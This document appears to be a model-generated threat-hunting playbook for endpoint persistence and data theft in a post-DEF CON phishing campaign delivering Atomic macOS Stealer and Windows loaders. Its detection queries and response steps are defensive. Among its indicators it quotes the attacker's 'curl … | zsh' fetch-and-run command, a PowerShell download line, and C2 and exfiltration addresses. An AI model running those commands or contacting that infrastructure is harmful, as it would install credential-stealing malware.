---
analysis: A single rule fires on the known plist name; this hunt uses prevalence to
  find any rare binaries in malware staging directories and correlates them with multi-surface
  network indicators to distinguish them from legitimate software updates.
blind_spots:
- id: macos-tcc-visibility
  owner: Endpoint Engineering
  question: Which specific files from Notes.app were accessed by the process?
  remediation: Deploy monitoring that captures TCC access events for com.apple.Notes.
  requires: Unified Logs or TCC database access
  risk: We can see staging in /tmp, but not the definitive source of all stolen data
    if the staging directory is deleted before collection.
  stage: amos-credential-collection
- id: network-visibility-gap
  owner: Network Security
  question: Did the host establish long-term heartbeats to the bot hosts?
  remediation: Increase retention for outbound network flow logs for workstations.
  requires: hb_network_connection with full 5-tuple
  risk: Short-lived connections or UDP-based heartbeats might be missed if logging
    intervals are coarse.
coverage:
- stage: amos-credential-collection
  status: covered
  steps:
  - identify-impacted-hosts
  - network-indicators-match
- stage: macos-persistence-launchd
  status: covered
  steps:
  - macos-launchd-persistence
- stage: windows-payload-staging
  status: covered
  steps:
  - identify-impacted-hosts
  - windows-payload-staging-baseline
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: initial-access-social-media
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: execution-malicious-sidebar
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: macos-delivery-clickfix
  status: out_of_scope
- reason: Belongs to another part of the 'Post-DEF CON Phishing Uses Malicious Google
    Doc to Deliver Malware' series.
  stage: windows-delivery-clickonce
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: Credential theft and persistent backdoors targeting conference attendees
    present a high risk of lateral movement; confirming the absence of these specific
    artifacts protects high-value identities.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder has staged stolen credentials in local temporary directories
  or established persistence via macOS LaunchDaemons and Windows UpdateCache directories
  following a malicious document lure.
labels:
- hunt
- attack.t1555
- attack.t1005
- attack.t1543.001
- attack.t1105
name: Endpoint Persistence and Data Exfiltration
parameters:
  c2_indicators:
    default:
    - 86.54.25.213
    - 192.253.248.181
    - 1foqo.lat
    - 2fksf.lat
    - 3pqow.lat
    - apple-googleapi.com
    - gapidriver.com
    description: C2 IPs and domains from the report used for matching.
    from:
      kind: article
      observed: '2026-08-19'
      ref: huntress-defcon-phishing
    type: list[string]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: manual
      observed: '2026-08-19'
      ref: standard-lookback
    type: number
  scope_hosts:
    default: []
    description: Output of identify-impacted-hosts; used to prioritize the parallel
      evidence gathering.
    from:
      kind: manual
      observed: '2026-08-19'
      ref: analyst-scoping
    type: list[host]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus initially on macOS and Windows workstations of users who attended
  major conferences. Widen scope to the full estate if network indicators match high-traffic
  tiers.
references:
- name: "Huntress \u2014 Post-DEF CON Phishing Uses Malicious Google Doc to Deliver\
    \ Malware"
  url: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
related:
- hunt: initial-access-social-media
  reason: This hunt focuses on endpoint aftermath, not the social media delivery vector.
  relation: out-of-scope-alternative
- hunt: cross-platform-malicious-doc-delivery
  relation: follows
scenario:
  stages:
  - name: Social Media Phishing
    observables:
    - X account @HartmansDoeke
    - Direct Message with CoinDesk conference lure
    - Google Doc link
    slug: initial-access-social-media
    tactic: initial-access
    techniques:
    - T1566.002
    - T1566.003
  - name: Malicious Google Apps Script Sidebar
    observables:
    - DecryptPanel.html
    - Fake document encryption prompt
    - Google Apps Script sidebar interaction
    slug: execution-malicious-sidebar
    tactic: execution
    techniques:
    - T1204.001
  - name: macOS ClickFix Delivery
    observables:
    - curl -fsSL https://apple-googleapi.com/i | zsh
    - GAPIUpdate.dmg
    - apple-googleapi.com
    - gapiupdate.dmg
    slug: macos-delivery-clickfix
    tactic: execution
    techniques:
    - T1059.004
    - T1204.002
  - name: AMOS Data Theft
    observables:
    - /tmp/lksopo
    - Notes.app database access
    - http://86.54.25.213/log
    slug: amos-credential-collection
    tactic: credential-access
    techniques:
    - T1555
    - T1005
  - name: macOS LaunchDaemon Persistence
    observables:
    - /Library/LaunchDaemons/com.xdivcmp.plist
    - launchctl bootstrap
    - ~/.phost
    - ~/.bhost
    - ~/.botid
    slug: macos-persistence-launchd
    tactic: persistence
    techniques:
    - T1543.001
  - name: Windows ClickOnce and PowerShell Execution
    observables:
    - https://gapidriver.com/installer/GapiUpdate.application
    - '%TEMP%\sys.ps1'
    - https://1foqo.lat/core4
    - Import-Module BitsTransfer; Start-BitsTransfer
    slug: windows-delivery-clickonce
    tactic: execution
    techniques:
    - T1059.001
    - T1204.002
  - name: Windows Payload Staging
    observables:
    - '%LOCALAPPDATA%\Microsoft\Windows\UpdateCache'
    - DockerDesktopSvc.exe
    - SteamClientHelperHost.exe
    - TeraCopyMonMon.exe
    - https://2fksf.lat/res10.php
    slug: windows-payload-staging
    tactic: persistence
    techniques:
    - T1105
  summary: Threat actors targeted DEF CON attendees via X direct messages using a
    conference planning lure that directed victims to a malicious Google Doc. The
    document used a custom Google Apps Script sidebar to trick users into executing
    platform-specific malware, delivering Atomic macOS Stealer (AMOS) on macOS and
    various RAT loaders on Windows via ClickOnce and PowerShell scripts.
series:
  index: 2
  slug: post-def-con-phishing-uses-malicious-google-doc-to-deliver-malware
  title: Post-DEF CON Phishing Uses Malicious Google Doc to Deliver Malware
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
tlp: clear
type: investigation
---


# Endpoint Persistence and Data Exfiltration

This hunt targets the post-exploitation phase of the post-DEF CON phishing campaign. It focuses on identifying hosts where AMOS (Atomic macOS Stealer) or Windows loaders have successfully staged data for exfiltration or established persistence.

We specifically look for the staging directory /tmp/lksopo on macOS, the creation of the com.xdivcmp.plist LaunchDaemon, and the population of the Windows UpdateCache and Temp directories with rare executables. By correlating these endpoint artifacts with network telemetry targeting known C2 infrastructure via direct IP connections and HTTP traffic, we can distinguish active compromises from unsuccessful initial access attempts.

## identify-impacted-hosts
<!-- Identify potentially impacted hosts by staging path -->
Find hosts where the specific malware staging directories or loader files have been touched to scope the rest of the hunt.

```sqlite target=endpoint role=scoping params=(lookback_days=lookback_days)
~~~yaml
expected: A list of hostnames that have touched known campaign artifacts. Silence
  suggests the payloads have not reached the staging phase on enrolled hosts.
reads:
- device_hostname
- file_path
- time
silence: not_evidence_of_absence
source: hb_file_activity
verified: dry-run
verified_at: '2026-09-18'
~~~
SELECT DISTINCT device_hostname FROM hb_file_activity WHERE (LOWER(file_path) = '/tmp/lksopo' OR LOWER(file_path) = '/library/launchdaemons/com.xdivcmp.plist' OR LOWER(file_path) LIKE '%\sys.ps1' OR LOWER(file_path) LIKE '%\microsoft\windows\updatecache\%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## gather-evidence
<!-- Gather multi-surface evidence -->
parallel:
- → macos-launchd-persistence
- → windows-payload-staging-baseline
- → network-indicators-match
join: → triage-investigation

## macos-launchd-persistence
<!-- macOS LaunchDaemon persistence -->
Detect the specific LaunchDaemon used by AMOS for persistence and its execution behavior.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: The presence of com.xdivcmp.plist or a LaunchDaemon executing commands pointing
  to the reported C2 infrastructure.
reads:
- device_hostname
- job_name
- job_definition_path
- job_cmd_line
- time
silence: evidence_of_absence
source: hb_scheduled_job
verified: dry-run
verified_at: '2026-09-18'
~~~
SELECT device_hostname, job_name, job_definition_path, job_cmd_line, time FROM hb_scheduled_job WHERE time >= datetime('now', '-{{lookback_days}} days') AND (LOWER(job_definition_path) = '/library/launchdaemons/com.xdivcmp.plist' OR job_cmd_line LIKE '%apple-googleapi%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0)
```

## windows-payload-staging-baseline
<!-- Rare files in Windows staging directories -->
Find rare executables dropped into UpdateCache, Temp, or Downloads, identifying anomalies via stack-counting.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Specific binaries like DockerDesktopSvc.exe or SteamClientHelperHost.exe
  appearing on a small number of hosts in non-standard directories.
prevalence:
  by: device_hostname
  key:
  - file_name
  rare_below: 3
reads:
- file_name
- device_hostname
- file_path
- time
silence: not_evidence_of_absence
source: hb_file_activity
verified: dry-run
verified_at: '2026-09-18'
~~~
SELECT LOWER(file_name) AS binary_name, COUNT(DISTINCT device_hostname) AS host_count, MIN(time) AS first_seen FROM hb_file_activity WHERE (LOWER(file_path) LIKE '%\updatecache\%' OR LOWER(file_path) LIKE '%\appdata\local\temp\%' OR LOWER(file_path) LIKE '%\downloads\%') AND LOWER(file_name) LIKE '%.exe' AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY binary_name HAVING host_count <= 3 ORDER BY host_count ASC
```

## network-indicators-match
<!-- C2 and exfiltration connection match -->
Corroborate endpoint anomalies with network traffic (HTTP and direct IP) to known malicious infrastructure.

```sqlite target=network role=enrichment params=(c2_indicators=c2_indicators, lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: Connections to 86.54.25.213, 192.253.248.181 or associated domains. Silence
  suggests the malware hasn't begun C2 heartbeats or exfiltration.
reads:
- device_hostname
- dst_endpoint_ip
- dst_endpoint_hostname
- protocol
- dst_endpoint_port
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-18'
~~~
SELECT device_hostname, dst_endpoint_ip, dst_endpoint_hostname, protocol, dst_endpoint_port, MIN(time) AS first_conn FROM hb_network_connection WHERE (instr(',' || '{{c2_indicators}}' || ',', ',' || LOWER(dst_endpoint_hostname) || ',') > 0 OR instr(',' || '{{c2_indicators}}' || ',', ',' || dst_endpoint_ip || ',') > 0) AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, dst_endpoint_ip, dst_endpoint_hostname, protocol, dst_endpoint_port
```

## triage-investigation
<!-- Triage compromised hosts -->
```agent target=hunter
cite: required
context:
- identify-impacted-hosts
- macos-launchd-persistence
- windows-payload-staging-baseline
- network-indicators-match
max_iterations: 6
objective: Decide whether the presence of specific staging paths, LaunchDaemons, or
  rare binaries, paired with network hits to the campaign infrastructure, constitutes
  a high-confidence compromise for each host.
success_criteria: A verdict of malicious, suspicious, or benign for each host, citing
  specific rows from the query results.
tools:
- endpoint
- network
```

## route-verdict
<!-- Route based on verdict -->
if~: "the triage verdict is malicious for at least one host based on confirmed persistence or staging paired with C2 traffic" (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: macos-tcc-visibility)
else: → analyst-review

## isolate-host
<!-- Isolate compromised endpoint -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host immediately via EDR action. Collect the contents of /tmp/lksopo (macOS) or the UpdateCache directory (Windows) before reimaging. Record any local configuration files like ~/.phost or ~/.bhost.
```
→ analyst-review

## analyst-review
<!-- Analyst manual investigation -->
```manual target=analyst
Review hosts with suspicious staging files but no confirmed network activity. Check for local configuration files like ~/.phost or ~/.bhost on macOS and recommend rotating any passwords found in Notes.app if accessed.
```
→ close-hunt

## close-hunt
<!-- Close hunt and record findings -->
```manual target=analyst
Document any identified compromised accounts. Update detection rules for the com.xdivcmp.plist LaunchDaemon if effective across the estate.
```
→ end
